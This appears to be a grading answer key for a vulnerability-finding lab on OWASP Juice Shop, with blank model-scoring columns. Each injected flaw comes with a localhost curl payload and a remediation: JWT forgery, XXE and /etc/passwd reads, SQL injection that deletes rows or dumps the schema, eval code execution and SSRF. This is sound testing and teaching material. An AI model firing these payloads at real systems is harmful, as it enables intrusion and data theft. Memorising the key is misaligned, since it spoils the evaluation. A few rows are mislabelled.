"ID","Source","Origin","Name","Category","Severity_or_Difficulty","CWE","CVE","Location","Manual_Reproduction","Remediation","Validated","Reference","Model_Found_YN","RootCause_Correct_YN","Remediation_Valid_YN","Scorer_Notes"
"INJ-60","INJECTED (created for this lab)","ADDED FOR THIS LAB","JWT weak secret","Broken Authentication","Critical","CWE-321","","POST http://localhost:3000/rest/mobile/session","The JWT secret is ""mobile"" (hardcoded). Forge a token: echo -n '{""alg"":""HS256"",""typ"":""JWT""}' | base64url ; echo -n '{""role"":""admin""}' | base64url ; sign with HMAC-SHA256 key ""mobile"" ; then: curl -X POST http://localhost:3000/rest/mobile/session -H ""authorization: Bearer <forged>""  -> {""valid"":true,""payload"":{""role"":""admin""}}.","Use a strong, randomly generated secret stored in environment variables.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-61","INJECTED (created for this lab)","ADDED FOR THIS LAB","IDOR (mobile profile by id)","Broken Access Control","High","CWE-639","","GET http://localhost:3000/rest/mobile/profile/:id","curl ""http://localhost:3000/rest/mobile/profile/3""  -> returns the admin user profile (id=3) without authentication.","Require authentication and verify that the requesting user matches the requested profile id (check profile.id === authenticated user id) before returning it.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-62","INJECTED (created for this lab)","ADDED FOR THIS LAB","SSRF (mobile image proxy)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/mobile/image?url=","Start a listener: nc -lp 9000 ; then: curl ""http://localhost:3000/rest/mobile/image?url=http://127.0.0.1:9000/""  -> server fetches the listener and returns its content.","Allowlist permitted hosts/schemes; block private IP ranges; do not proxy arbitrary user URLs.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-63","INJECTED (created for this lab)","ADDED FOR THIS LAB","CSV injection","Injection","Medium","CWE-1236","","GET http://localhost:3000/rest/feedback/export?product=","curl -X POST ""http://localhost:3000/rest/feedback/prod1"" -H 'content-type: application/json' -d '{""name"":""=1+1"",""message"":""test""}'  ; then: curl ""http://localhost:3000/rest/feedback/export?product=prod1""  -> CSV name cell starts with = (formula injection when opened in Excel).","Prefix cells that start with =, +, -, @, or tab with a single quote; or use a CSV library that escapes formula characters.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-64","INJECTED (created for this lab)","ADDED FOR THIS LAB","Stored XSS (feedback HTML)","XSS","High","CWE-79","","GET http://localhost:3000/rest/feedback/:product","curl -X POST ""http://localhost:3000/rest/feedback/prod1"" -H 'content-type: application/json' -d '{""name"":""x"",""message"":""<script>alert(1)</script>""}'  ; then: curl ""http://localhost:3000/rest/feedback/prod1""  -> HTML contains the unescaped script tag.","HTML-encode all user-supplied content before rendering.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-65","INJECTED (created for this lab)","ADDED FOR THIS LAB","XML bomb / XXE","Injection","Critical","CWE-611","","POST http://localhost:3000/rest/feedback/xml","echo SECRET > /tmp/xxe_test2.txt ; curl -X POST http://localhost:3000/rest/feedback/xml -H 'content-type: application/xml' -d '<?xml version=""1.0""?><!DOCTYPE r [<!ENTITY x SYSTEM ""file:///tmp/xxe_test2.txt"">]><r><message>&x;</message></r>'  -> parsed field contains the file contents (SECRET).","Disable external entity resolution; use a safe XML parser with DTD processing off.","YES - tested locally; passes the 65/65 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-66","INJECTED (created for this lab)","ADDED FOR THIS LAB","Timing attack (password comparison)","Authentication","High","CWE-208","","POST http://localhost:3000/rest/inventory/verify-password","Send multiple requests with progressively longer passwords that match the start of the real password: curl -X POST http://localhost:3000/rest/inventory/verify-password -H 'content-type: application/json' -d '{""user"":""admin"",""password"":""a""}'  (~50ms) vs curl -X POST http://localhost:3000/rest/inventory/verify-password -H 'content-type: application/json' -d '{""user"":""admin"",""password"":""adminpass123""}'  (~140ms)  -> the per-character delay loop makes correct passwords take measurably longer, allowing byte-by-byte extraction via timing.","Use a constant-time comparison function (e.g. crypto.timingSafeEqual) that always compares all bytes regardless of match; do not add per-character delays or early-exit loops.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-67","INJECTED (created for this lab)","ADDED FOR THIS LAB","Information disclosure (stack trace)","Information Disclosure","Medium","CWE-209","","GET http://localhost:3000/rest/inventory/details?sku=","curl ""http://localhost:3000/rest/inventory/details?sku=x'""  -> 500 error response includes a full stack trace with internal file paths and line numbers (the unbalanced quote causes a SQL syntax error caught by the catch block).","Never expose stack traces to clients; return a generic error message and log the full error server-side only.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-68","INJECTED (created for this lab)","ADDED FOR THIS LAB","Type confusion (typeof bypass)","Injection","High","CWE-843","","POST http://localhost:3000/rest/inventory/filter","curl -X POST http://localhost:3000/rest/inventory/filter -H 'content-type: application/json' -d '{""type"":{""column"":""1=1"",""value"":""1""}}'  -> the typeof check for object allows SQL injection via the column and value properties (raw SQL is executed).","Validate input with a schema; never accept object values for query parameters; use a whitelist of allowed column names.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-69","INJECTED (created for this lab)","ADDED FOR THIS LAB","Insecure random (token generation)","Broken Authentication","High","CWE-330","","GET http://localhost:3000/rest/prices/token?sku=","curl ""http://localhost:3000/rest/prices/token?sku=JUICE-001"" (request 10 times) -> tokens are based on Math.random() and Date.now(), making them predictable; an attacker who knows the approximate time can brute-force the token.","Use crypto.randomBytes for security-sensitive token generation; never use Math.random() for secrets.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-70","INJECTED (created for this lab)","ADDED FOR THIS LAB","Null byte injection","Injection","High","CWE-158","","GET http://localhost:3000/rest/prices/lookup?sku=","curl ""http://localhost:3000/rest/prices/lookup?sku=JUICE-001%00admin""  -> the null byte (%00) may truncate the SKU in downstream processing, causing unexpected behavior (different code paths treat the string differently).","Strip null bytes from all user input; validate that strings do not contain \0 characters.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-71","INJECTED (created for this lab)","ADDED FOR THIS LAB","Regex injection (user-controlled pattern)","Injection","Medium","CWE-1333","","GET http://localhost:3000/rest/prices/search?pattern=","curl -G ""http://localhost:3000/rest/prices/search"" --data-urlencode ""pattern=(JUICE-001.*).*"" --data-urlencode ""limit=100""  -> the user-supplied regex is compiled and executed directly, allowing catastrophic backtracking or unexpected matching behavior.","Never compile user-supplied regex patterns; use pre-defined patterns or a safe regex library that limits complexity.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-72","INJECTED (created for this lab)","ADDED FOR THIS LAB","CRLF injection (HTTP response splitting)","Injection","High","CWE-93","","GET http://localhost:3000/rest/orders/export?format=","curl -v ""http://localhost:3000/rest/orders/export?format=x%0d%0aSet-Cookie:%20hacked""  -> the X-Export-Format response header contains the injected Set-Cookie header (CRLF characters allow HTTP response splitting).","Strip or reject CR/LF characters in all user input that is placed in HTTP headers.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-73","INJECTED (created for this lab)","ADDED FOR THIS LAB","Excessive data exposure (API over-sharing)","Information Disclosure","Medium","CWE-200","","GET http://localhost:3000/rest/orders/all","curl ""http://localhost:3000/rest/orders/all""  -> response includes creditCard and address fields (full credit card numbers and home addresses) that the frontend never displays.","Use field-level filtering (e.g., a response schema) to return only the fields the client needs; never SELECT * and return everything.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-74","INJECTED (created for this lab)","ADDED FOR THIS LAB","Missing rate limiting (brute force)","Broken Authentication","Medium","CWE-307","","POST http://localhost:3000/rest/orders/verify-discount","Send 100 rapid requests: curl -X POST http://localhost:3000/rest/orders/verify-discount -H 'content-type: application/json' -d '{""code"":""guess1""}' ... guess100  -> 100 attempts succeed without any lockout, rate limit, or delay.","Add rate limiting (e.g., express-rate-limit) with a threshold and exponential backoff; lock accounts after N failed attempts.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-75","INJECTED (created for this lab)","ADDED FOR THIS LAB","Session fixation","Broken Authentication","High","CWE-384","","POST http://localhost:3000/rest/session/login","curl -X POST http://localhost:3000/rest/session/login -H 'content-type: application/json' -d '{""user"":""admin"",""password"":""admin123"",""session"":""session-abc""}'  -> the server accepts a user-supplied session ID and promotes it to admin without regenerating it.","Always regenerate the session ID after login; never accept a user-supplied session identifier.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-76","INJECTED (created for this lab)","ADDED FOR THIS LAB","Insecure cookie (missing flags)","Broken Authentication","Medium","CWE-1004","","GET http://localhost:3000/rest/session/cookie?session=","curl -v ""http://localhost:3000/rest/session/cookie?session=test123""  -> Set-Cookie header sets the session cookie without Secure, HttpOnly, or SameSite flags.","Set the Secure, HttpOnly, and SameSite=Strict flags on all session cookies.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-77","INJECTED (created for this lab)","ADDED FOR THIS LAB","Weak password hash (SHA1)","Cryptographic Failures","High","CWE-328","","POST http://localhost:3000/rest/session/reset-password","curl -X POST http://localhost:3000/rest/session/reset-password -H 'content-type: application/json' -d '{""user"":""admin"",""password"":""newpass""}'  -> response confirms hashAlgorithm is SHA1, which is cryptographically weak and susceptible to rainbow table attacks.","Use bcrypt, scrypt, or Argon2 for password hashing; never use SHA1 or MD5 for passwords.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-78","INJECTED (created for this lab)","ADDED FOR THIS LAB","Local file inclusion","Injection","Critical","CWE-98","","GET http://localhost:3000/rest/content/include?file=","curl ""http://localhost:3000/rest/content/include?file=../../package.json""  -> response includes the contents of package.json (path traversal escapes the views/templates directory; no suffix is appended so the exact filename is used).","Validate the file name against a strict pattern; reject path separators; use a whitelist of allowed template names.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-79","INJECTED (created for this lab)","ADDED FOR THIS LAB","Server-side template injection (EJS)","Injection","Critical","CWE-94","","POST http://localhost:3000/rest/content/render","curl -X POST http://localhost:3000/rest/content/render -H 'content-type: application/json' -d '{""template"":""<%= 7*143 %>""}'  -> response body is ""1001"" (EJS evaluates the arithmetic expression, confirming server-side template injection).","Install ejs as a dependency and ensure user input is never passed as a template; use pre-compiled templates or a sandboxed template engine.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-80","INJECTED (created for this lab)","ADDED FOR THIS LAB","Symlink attack (file read)","Path Traversal","High","CWE-59","","GET http://localhost:3000/rest/content/asset?asset=","ln -s /etc/passwd /tmp/evil_link ; curl ""http://localhost:3000/rest/content/asset?asset=../../tmp/evil_link""  -> response contains /etc/passwd (readFileSync follows symlinks, allowing access to files outside the assets directory).","Use fs.realpath() to resolve the final path and verify it is within the allowed directory; reject symlinks that escape the root.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-81","INJECTED (created for this lab)","ADDED FOR THIS LAB","Log injection (CRLF)","Injection","Medium","CWE-117","","POST http://localhost:3000/rest/analytics/event","curl -X POST http://localhost:3000/rest/analytics/event -H 'content-type: application/json' -d '{""event"":""normal\\n[2024-01-01] FAKE LOG ENTRY: admin login""}'  -> the event log now contains a fake log entry with a spoofed timestamp (CRLF injection allows log forging).","Strip or escape CR/LF characters in all user input before writing to logs; use a structured logging format (JSON).","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-82","INJECTED (created for this lab)","ADDED FOR THIS LAB","DNS rebinding (SSRF via hostname)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/analytics/report?host=","curl ""http://localhost:3000/rest/analytics/report?host=127.0.0.1:9090"" (with a listener on 9090)  -> server fetches http://127.0.0.1:9090/report and returns the response (SSRF via user-supplied hostname; DNS rebinding can bypass hostname checks).","Validate the resolved IP address after DNS lookup, not just the hostname; block private IP ranges and enforce a single resolution.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-83","INJECTED (created for this lab)","ADDED FOR THIS LAB","Web cache poisoning","Broken Access Control","High","CWE-525","","GET http://localhost:3000/rest/analytics/pixel?key=","curl ""http://localhost:3000/rest/analytics/pixel?key=malicious_payload""  -> the X-Track-Key header is set from user input and cached for 3600 seconds (Cache-Control: public, max-age=3600), poisoning any shared cache.","Do not set cache headers from user input; strip X-Track-Key or use a server-generated value; disable caching for dynamic responses.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-84","INJECTED (created for this lab)","ADDED FOR THIS LAB","XML bomb (entity expansion DoS)","Injection","High","CWE-776","","POST http://localhost:3000/rest/reviews/xml","curl -X POST http://localhost:3000/rest/reviews/xml -H 'content-type: application/xml' -d '<?xml version=""1.0""?><!DOCTYPE r [<!ENTITY a ""AAAAAAAAAA""><!ENTITY b ""&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"">]><r><content>&b;</content></r>'  -> server memory is exhausted by the expanding entity (billion laughs attack variant).","Disable DTD processing and entity expansion; use a safe XML parser that limits entity depth and total expansion size.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-85","INJECTED (created for this lab)","ADDED FOR THIS LAB","Insecure file upload (no type validation)","Injection","High","CWE-434","","POST http://localhost:3000/rest/reviews/upload","curl -X POST http://localhost:3000/rest/reviews/upload -H 'content-type: application/json' -d '{""filename"":""../malicious.js"",""content"":""alert(1)""}'  -> the server writes a .js file to uploads/ with no type validation, and path traversal in the filename allows writing outside uploads/.","Validate file types against an allowlist; generate safe filenames server-side; reject path separators in filenames.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-86","INJECTED (created for this lab)","ADDED FOR THIS LAB","Denial of service (unbounded recursion)","Injection","Medium","CWE-674","","POST http://localhost:3000/rest/reviews/metadata","node -e ""let o={},c=o;for(let i=0;i<500;i++){c.a={};c=c.a}fetch('http://localhost:3000/rest/reviews/metadata',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({data:o})}).then(r=>r.json()).then(console.log)""  -> deeply nested JSON causes the recursive depth() function to exceed the stack limit and crash.","Limit the maximum nesting depth of parsed JSON; use an iterative algorithm instead of recursion for unbounded data.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-87","INJECTED (created for this lab)","ADDED FOR THIS LAB","CORS misconfiguration (wildcard with credentials)","Broken Access Control","High","CWE-942","","GET http://localhost:3000/rest/support/cors","curl -v ""http://localhost:3000/rest/support/cors"" -H ""Origin: https://evil.example.com""  -> response headers: Access-Control-Allow-Origin: https://evil.example.com, Access-Control-Allow-Credentials: true (reflects arbitrary origin with credentials).","Validate the Origin header against an allowlist of trusted domains; never reflect arbitrary origins with Allow-Credentials: true.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-88","INJECTED (created for this lab)","ADDED FOR THIS LAB","Information disclosure (debug mode)","Information Disclosure","Medium","CWE-489","","GET http://localhost:3000/rest/support/debug?debug=","curl ""http://localhost:3000/rest/support/debug?debug=true""  -> response includes process.env, node version, platform, cwd, memory usage, and PID (debug mode leaks server internals).","Disable debug endpoints in production; gate behind admin authentication; never expose process information to clients.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-89","INJECTED (created for this lab)","ADDED FOR THIS LAB","Null byte injection (file path truncation)","Path Traversal","High","CWE-158","","GET http://localhost:3000/rest/support/download?file=","curl ""http://localhost:3000/rest/support/download?file=../../etc/passwd%00.txt""  -> the null byte truncates the path so readFileSync reads /etc/passwd instead of /etc/passwd.txt.","Strip null bytes from all user input before using in file paths; validate against a strict pattern.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-90","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (DELETE statement)","Injection","Critical","CWE-89","","DELETE http://localhost:3000/rest/warehouse/:id","curl -X DELETE ""http://localhost:3000/rest/warehouse/1%20OR%201=1""  -> deletes all warehouse rows (the OR 1=1 is concatenated into the DELETE WHERE clause).","Use parameterized queries for DELETE statements; validate that the ID is a number; never concatenate user input into SQL.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-91","INJECTED (created for this lab)","ADDED FOR THIS LAB","SSRF (DNS resolution)","SSRF","Critical","CWE-918","","GET http://localhost:3000/rest/warehouse/check-service?service=","Start a listener: nc -lp 9090 ; then: curl ""http://localhost:3000/rest/warehouse/check-service?service=127.0.0.1""  -> server fetches http://127.0.0.1:9090/health and returns the response.","Allowlist permitted service hostnames; block private IP ranges; do not fetch arbitrary user-supplied URLs.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-92","INJECTED (created for this lab)","ADDED FOR THIS LAB","Buffer over-read (info disclosure)","Information Disclosure","Medium","CWE-125","","GET http://localhost:3000/rest/warehouse/info?id=1&len=","curl ""http://localhost:3000/rest/warehouse/info?id=1&len=999""  -> response info field contains the full JSON of the row including internal fields (no bounds check on len parameter).","Validate the len parameter against the actual data length; do not allow users to control substring bounds on internal data.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-93","INJECTED (created for this lab)","ADDED FOR THIS LAB","Password stored in plaintext","Cryptographic Failures","High","CWE-256","","GET http://localhost:3000/rest/billing/account/:id","curl ""http://localhost:3000/rest/billing/account/1""  -> response includes the password field in plaintext (""plaintextpass123""), because passwords are stored unhashed in the database.","Hash passwords with bcrypt/scrypt/Argon2 before storing; never store plaintext passwords in a database.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-94","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (UPDATE statement)","Injection","Critical","CWE-89","","PUT http://localhost:3000/rest/billing/balance/:id","curl -X PUT ""http://localhost:3000/rest/billing/balance/1"" -H 'content-type: application/json' -d '{""balance"":""999999""}'  -> the balance value is concatenated directly into the UPDATE statement, allowing arbitrary SQL injection in the SET clause.","Use parameterized queries for UPDATE statements; validate that balance is a number; never concatenate user input into SQL.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-95","INJECTED (created for this lab)","ADDED FOR THIS LAB","Open redirect (header-based)","Broken Access Control","Medium","CWE-601","","GET http://localhost:3000/rest/billing/redirect","curl -v ""http://localhost:3000/rest/billing/redirect"" -H ""Referer: https://evil.example.com""  -> 302 redirect to https://evil.example.com (the server trusts the Referer header for the redirect target).","Validate the redirect target against an allowlist of known destinations; never redirect to user-controlled headers.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-96","INJECTED (created for this lab)","ADDED FOR THIS LAB","Insecure deserialization (JSON eval)","Injection","Critical","CWE-502","","POST http://localhost:3000/rest/subscriptions/restore","curl -X POST http://localhost:3000/rest/subscriptions/restore -H 'content-type: application/json' -d '{""data"":""process.env.NODE_ENV""}'  -> response data field evaluates the expression via eval() (arbitrary code execution; e.g., process.env leaks environment variables).","Never use eval() on user input; use JSON.parse() with schema validation; restrict the data format to known-safe types.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-97","INJECTED (created for this lab)","ADDED FOR THIS LAB","Business logic flaw (negative quantity)","Broken Access Control","High","CWE-840","","PUT http://localhost:3000/rest/subscriptions/:id/quantity","curl -X PUT ""http://localhost:3000/rest/subscriptions/1/quantity"" -H 'content-type: application/json' -d '{""quantity"":-100}'  -> total becomes negative (-999.00), meaning the customer is credited money for a negative subscription.","Validate that quantity is a positive integer; reject negative values; enforce a minimum and maximum quantity.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-98","INJECTED (created for this lab)","ADDED FOR THIS LAB","SQL injection (boolean-based blind)","Injection","High","CWE-89","","GET http://localhost:3000/rest/audit/search?condition=","curl -G ""http://localhost:3000/rest/audit/search"" --data-urlencode ""condition=1=1 UNION SELECT type,sql,3,4 FROM sqlite_master""  -> returns CREATE TABLE statements from sqlite_master (the condition is concatenated into a SELECT with 4 columns: id, event, userId, timestamp).","Use parameterized queries; never concatenate user input into a WHERE clause.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-99","INJECTED (created for this lab)","ADDED FOR THIS LAB","Hardcoded encryption key","Cryptographic Failures","Critical","CWE-321","","POST http://localhost:3000/rest/audit/encrypt","curl -X POST http://localhost:3000/rest/audit/encrypt -H 'content-type: application/json' -d '{""record"":""test""}'  -> response includes keyUsed: ""1234567890abcdef"" (the AES-128-CBC key is hardcoded in source code and visible in the API response).","Store encryption keys in environment variables or a secrets manager; never hardcode them in source code or return them in API responses.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"INJ-100","INJECTED (created for this lab)","ADDED FOR THIS LAB","Information disclosure (error leaks query)","Information Disclosure","Medium","CWE-209","","GET http://localhost:3000/rest/audit/:id","curl ""http://localhost:3000/rest/audit/abc""  -> 500 error response includes the full SQL query (""SELECT id, event, userId FROM audit_logs WHERE id = abc""), revealing the table schema and column names.","Never include SQL queries in error responses; return a generic error message and log the full error server-side only.","YES - tested locally; passes the 100/100 exploit suite (reproduction command was run)","answer-key/VERIFY.md (independent confirmation)","","","",""
"ORIG-001","ORIGINAL (built into Juice Shop)","PRE-EXISTING (Juice Shop built-in)","Password Hash Leak","Sensitive Data Exposure","Difficulty 2/6","","","built-in (see Score Board)","Objective: Obtain the password (hash) of the currently logged-in user directly from a REST API endpoint.  Hints: You need to understand what happens ""behind the scenes"", so make sure to use your DevTools or a proxy to inspect network traffic. | Look for an API endpoint that already returns some user information. | An overly generic solution for data retrieval can backfire if not properly safeguarded.  (Full step-by-step: solve in the in-app Score Board at http://localhost:3000/#/score-board, or the 'Pwning OWASP Juice Shop' companion guide.)","Sensitive Data Exposure - mitigation: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure","NOT tested here - from OWASP Juice Shop official challenge data (challenges.yml, MIT License)","https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure ; in-app Score Board ; https://pwning.owasp-juice.shop/","","","",""
"ORIG-002","ORIGINAL (built into Juice Shop)","PRE-EXISTING (Juice Shop built-in)","API-only XSS","XSS","Difficulty 3/6","","","built-in (see Score Board)","Objective: Perform a persisted XSS attack with <iframe src=""javascript:alert(`xss`)""> without using the frontend application at all.  Hints: You need to work with the server-side API directly. Try different HTTP verbs on different entities exposed through the API. | A matrix of known data entities and their supported HTTP verbs through the API can help you here. | Careless developers might have exposed API methods that the client does not even need.  (Full step-by-step: solve in the in-app Score Board at http://localhost:3000/#/score-board, or the 'Pwning OWASP Juice Shop' companion guide.)","XSS - mitigation: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html","NOT tested here - from OWASP Juice Shop official challenge data (challenges.yml, MIT License)","https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html ; in-app Score Board ; https://pwning.owasp-juice.shop/","","","",""
"ORIG-003","ORIGINAL (built into Juice Shop)","PRE-EXISTING (Juice Shop built-in)","Access Log","Observability Failures","Difficulty 4/6","","","built-in (see Score Board)","Objective: Gain access to any access log file of the server.  Hints: Who would want a server access log to be accessible through a web application? | Normally, server log files are written to disk on server side and are not accessible from the outside. | One particular file found in the folder you might already have found during the ""Access a confidential document"" challenge might give you an idea who is interested in such a public exposure. | Drilling down one level into the file system might not be sufficient.  (Full step-by-step: solve in the in-app Score Board at http://localhost:3000/#/score-board, or the 'Pwning OWASP Juice Shop' companion guide.)","Observability Failures - mitigation: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html","NOT tested here - from OWASP Juice Shop official challenge data (challenges.yml, MIT License)","https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html ; in-app Score Board ; https://pwning.owasp-juice.shop/","","","",""
"ORIG-004","ORIGINAL (built into Juice Shop)","PRE-EXISTING (Juice Shop built-in)","Admin Registration","Improper Input Validation","Difficulty 3/6","","","built-in (see Score Board)","Objective: Register as a user with administrator privileges.  Hints: You have to assign the unassignable. | Register as an ordinary user to learn what API endpoints are involved in this use case. | Think of the simplest possible implementations of a distinction between regular users and administrators.  (Full step-by-step: solve in the in-app Score Board at http://localhost:3000/#/score-board, or the 'Pwning OWASP Juice Shop' companion guide.)","Improper Input Validation - mitigation: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html","NOT tested here - from OWASP Juice Shop official challenge data (challenges.yml, MIT License)","https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html ; in-app Score Board ; https://pwning.owasp-juice.shop/","","","",""
"ORIG-005","ORIGINAL (built into Juice Shop)","PRE-EXISTING (Juice Shop built-in)","Admin Section","Broken Access Control","Difficulty 2/6","","","built-in (see Score Board)","Objective: Access the administration section of the store.  Hints: It is just slightly harder to find than the score board link. | Knowing it exists, you can simply guess what URL the admin section might have. | Alternatively, you can try to find a reference or clue within the parts of the application that are not usually visible in the browser. | It is probably just slightly harder to find and gain access to than the score board link. | There is some access control in place, but there are at least three ways to bypass it.  (Full step-by-step: solve in the in-app Score Board at http://localhost:3000/#/score-board, or the 'Pwning OWASP Juice Shop' companion guide.)","Broken Access Control - mitigation: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html","NOT tested here - from OWASP Juice Shop official challenge data (challenges.yml, MIT License)","https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html ; in-app Score Board ; https://pwning.owasp-juice.shop/","","","",""
